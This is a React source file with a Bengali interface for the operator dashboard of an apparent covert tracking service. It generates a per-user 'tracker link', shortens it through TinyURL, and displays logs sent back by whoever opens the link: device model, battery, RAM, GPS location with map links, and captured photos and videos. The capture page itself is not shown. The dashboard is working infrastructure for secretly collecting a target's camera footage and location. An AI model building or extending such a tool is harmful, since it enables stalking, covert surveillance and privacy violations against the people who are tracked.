
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';
import { useNavigate } from 'react-router-dom';

interface LogEntry {
  id: string;
  timestamp: any;
  deviceModel: string;
  battery: number;
  ram?: number;
  storage?: string;
  location?: { lat: number; lng: number };
  photoUrl?: string;
  videoUrl?: string;
  status: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const navigate = useNavigate();
  
  const baseUrl = 'https://livecameralocationdetails.vercel.app';
  const trackerLink = `${baseUrl}/#/track/${user.uid}`;

  useEffect(() => {
    const q = query(
      collection(db, "logs"), 
      where("userId", "==", user.uid)
    );

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as LogEntry[];

      data.sort((a, b) => {
        const timeA = a.timestamp?.seconds || 0;
        const timeB = b.timestamp?.seconds || 0;
        return timeB - timeA;
      });

      setLogs(data);
      setLoading(false);
    }, (error) => {
      console.error("Firestore error:", error);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [user.uid]);

  const handleSignOut = () => {
    signOut(auth);
    navigate('/login');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const shortenWithTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) {
        const url = await response.text();
        setShortUrl(url);
      } else {
        throw new Error('Failed to shorten');
      }
    } catch (err) {
      alert('লিংক শর্ট করতে সমস্যা হয়েছে।');
    } finally {
      setShortening(false);
    }
  };

  const latestLog = logs[0] || null;

  return (
    <div className="min-h-screen bg-slate-50">
      <nav className="bg-white border-b border-gray-100 px-6 py-4 flex justify-between items-center sticky top-0 z-10">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
            <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800">ড্যাশবোর্ড</h1>
        </div>
        <div className="flex items-center gap-4">
          <div className="hidden md:flex flex-col items-end">
            <span className="text-gray-800 font-semibold text-sm">{user.displayName || 'ইউজার'}</span>
            <span className="text-gray-400 text-xs">অ্যাডমিন প্রোফাইল</span>
          </div>
          <button onClick={handleSignOut} className="text-red-500 font-medium text-sm border border-red-100 px-4 py-2 rounded-xl hover:bg-red-50">লগ আউট</button>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto p-6 space-y-8">
        <div className="bg-gradient-to-r from-blue-600 to-indigo-700 rounded-3xl p-8 text-white shadow-xl relative overflow-hidden">
          <h2 className="text-3xl font-bold mb-2 relative z-10">হ্যালো, {user.displayName?.split(' ')[0] || 'ইউজার'}!</h2>
          <p className="text-blue-100 relative z-10">আপনার ট্র্যাকিং ড্যাশবোর্ড আপডেট করা হয়েছে।</p>
          <div className="absolute top-0 right-0 w-64 h-64 bg-white/10 rounded-full -mr-20 -mt-20"></div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">মোট তথ্য</p>
            <h3 className="text-2xl font-bold text-gray-800">{logs.length}</h3>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">ব্যাটারি লেভেল</p>
            <h3 className="text-2xl font-bold text-gray-800">{latestLog ? `${latestLog.battery}%` : 'N/A'}</h3>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
            <p className="text-gray-500 text-sm">ডিভাইস র‍্যাম</p>
            <h3 className="text-2xl font-bold text-gray-800">{latestLog?.ram ? `${latestLog.ram} GB` : 'N/A'}</h3>
          </div>
        </div>

        <div className="bg-white p-8 rounded-2xl shadow-sm border border-gray-100">
          <h3 className="text-lg font-bold mb-4">আপনার ট্র্যাকিং লিংক</h3>
          <div className="flex flex-col md:flex-row gap-3">
            <div className="flex-1 bg-gray-50 px-4 py-3.5 rounded-xl border border-gray-200 font-mono text-sm overflow-hidden text-ellipsis whitespace-nowrap">{trackerLink}</div>
            <div className="flex gap-2">
              <button onClick={() => copyToClipboard(trackerLink)} className="bg-blue-600 text-white px-6 py-3 rounded-xl font-semibold">{copySuccess ? "কপি হয়েছে!" : "লিংক কপি"}</button>
              <button onClick={shortenWithTinyUrl} disabled={shortening} className="bg-slate-800 text-white px-6 py-3 rounded-xl font-semibold disabled:opacity-50">{shortening ? "শর্ট হচ্ছে..." : "TinyURL"}</button>
            </div>
          </div>
          {shortUrl && (
            <div className="mt-4 p-4 bg-blue-50 border border-blue-100 rounded-xl flex justify-between items-center">
              <span className="font-bold text-blue-800">{shortUrl}</span>
              <button onClick={() => copyToClipboard(shortUrl)} className="text-sm font-bold text-blue-600">কপি করুন</button>
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-6 border-b border-gray-100"><h3 className="text-lg font-bold text-gray-800">অ্যাক্টিভিটি লগ</h3></div>
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead className="bg-gray-50 text-gray-500 text-xs uppercase font-bold">
                <tr>
                  <th className="px-6 py-4">সময়</th>
                  <th className="px-6 py-4">ডিভাইস ও র‍্যাম</th>
                  <th className="px-6 py-4">ব্যাটারি</th>
                  <th className="px-6 py-4">অবস্থান</th>
                  <th className="px-6 py-4">ফটো ও ভিডিও</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {logs.length === 0 ? (
                  <tr><td colSpan={5} className="px-6 py-20 text-center text-gray-400">কোনো তথ্য নেই</td></tr>
                ) : (
                  logs.map((log) => (
                    <tr key={log.id} className="hover:bg-blue-50/30">
                      <td className="px-6 py-4 text-sm whitespace-nowrap">{log.timestamp?.toDate().toLocaleString('bn-BD')}</td>
                      <td className="px-6 py-4 text-sm font-bold">{log.deviceModel} ({log.ram || '?'}GB)</td>
                      <td className="px-6 py-4 text-xs font-bold">{log.battery}%</td>
                      <td className="px-6 py-4">
                        {log.location ? <a href={`https://www.google.com/maps?q=${log.location.lat},${log.location.lng}`} target="_blank" className="text-blue-600 font-bold text-xs underline">ম্যাপ</a> : 'N/A'}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex gap-2">
                          {log.photoUrl && <img src={log.photoUrl} className="w-10 h-10 rounded object-cover cursor-pointer" onClick={() => window.open(log.photoUrl)} />}
                          {log.videoUrl && (
                            <button onClick={() => window.open(log.videoUrl)} className="w-10 h-10 bg-red-100 text-red-600 rounded flex items-center justify-center">
                              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z"/></svg>
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
        <footer className="text-center py-10 text-gray-400 text-sm">Developed by <b>Arefin Foysal</b></footer>
      </main>
    </div>
  );
};

export default Dashboard;
